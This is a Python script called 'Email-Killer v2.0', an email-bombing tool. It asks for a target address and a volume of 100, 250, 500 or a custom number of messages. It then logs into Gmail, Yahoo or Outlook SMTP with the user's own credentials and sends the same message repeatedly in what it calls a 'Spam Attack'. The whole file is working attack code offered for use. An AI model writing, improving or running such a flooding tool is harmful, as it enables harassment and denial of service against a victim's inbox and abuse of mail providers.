
import smtplib
import sys


class bcolors:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'


def banner():
	print(bcolors.GREEN +'=================================')
	print(bcolors.GREEN +'|:DynamicSecurityServices:|- ****')
	print(bcolors.GREEN +'|:Email-Killer v2.0:|------- ****')
	print(bcolors.GREEN +'|:Created By: CodingUrLife:| ****')
	print(bcolors.GREEN + '''=================================''')


class Email_Killer:
	count = 0

	def __init__(self):
		try:
			print(bcolors.RED + '\n**** Initializing Program ****')
			self.target = str(input(bcolors.GREEN + 'Enter Target Email : '))
			self.mode = int(
				input(bcolors.GREEN + 'Enter Killer mode (1,2,3,4) || 1:(100) 2:(250) 3:(500) 4:(custom) <: '))
			if int(self.mode) > int(4) or int(self.mode) < int(1):
				print('ERROR: Try Again Invalid Option.')
				sys.exit(1)
		except Exception as e:
			print(f'ERROR: {e}')

	def Spam(self):
		try:
			print(bcolors.RED + '\n**** Setting Up Email-Killer v2.0 ****')
			self.amount = None
			if self.mode == int(1):
				self.amount = int(100)
			elif self.mode == int(2):
				self.amount = int(250)
			elif self.mode == int(3):
				self.amount = int(500)
			else:
				self.amount = int(input(bcolors.GREEN + 'Choose A Custom Killer :'))
			print(bcolors.RED + f'\n**** You Have Selected Killer Mode: {self.mode} And {self.amount} Emails ****')
		except Exception as e:
			print(f'ERROR: {e}')

	def email(self):
		try:
			print(bcolors.RED + '\n**** Setting Up Email-Killer v2.0 ****')
			self.server = str(
				input(bcolors.GREEN + 'Enter Email Server | Or Select Premade Options - 1:Gmail 2:Yahoo 3:Outlook :'))
			premade = ['1', '2', '3']
			default_port = True
			if self.server not in premade:
				default_port = False
				self.port = int(input(bcolors.GREEN + 'Enter Port Number : '))

			if default_port == True:
				self.port = int(587)

			if self.server == '1':
				self.server = 'smtp.gmail.com'
			elif self.server == '2':
				self.server = 'smtp.mail.yahoo.com'
			elif self.server == '3':
				self.server = 'smtp-mail.outlook.com'

			self.fromAddr = str(input(bcolors.GREEN + 'Enter Your Email : '))
			self.fromPwd = str(input(bcolors.GREEN + 'Enter Your Password :'))
			self.subject = str(input(bcolors.GREEN + 'Enter Title Message : '))
			self.message = str(input(bcolors.GREEN + 'Enter Base Message : '))

			self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

			self.s = smtplib.SMTP(self.server, self.port)
			self.s.ehlo()
			self.s.starttls()
			self.s.ehlo()
			self.s.login(self.fromAddr, self.fromPwd)
		except Exception as e:
			print(f'ERROR!!! :( Invalid Login or Turn On Less Secure Apps: {e}')

	def send(self):
		try:
			self.s.sendmail(self.fromAddr, self.target, self.msg)
			self.count += 1
			print(bcolors.YELLOW + f':> Message Successfully Sent <: {self.count}')
		except Exception as e:
			print(f'ERROR!!! :( Invalid Login or Turn On Less Secure Apps: {e}')

	def attack(self):
		print(bcolors.RED + '\n**** Attacking Targeted Email-Address ****')
		for email in range(self.amount + 1):
			self.send()
		self.s.close()
		print(bcolors.GREEN + '\n**** Spam Attack Finished ****')
		sys.exit(0)


if __name__ == '__main__':
	banner()
	Killer = Email_Killer()
	Killer.Spam()
	Killer.email()
	Killer.attack()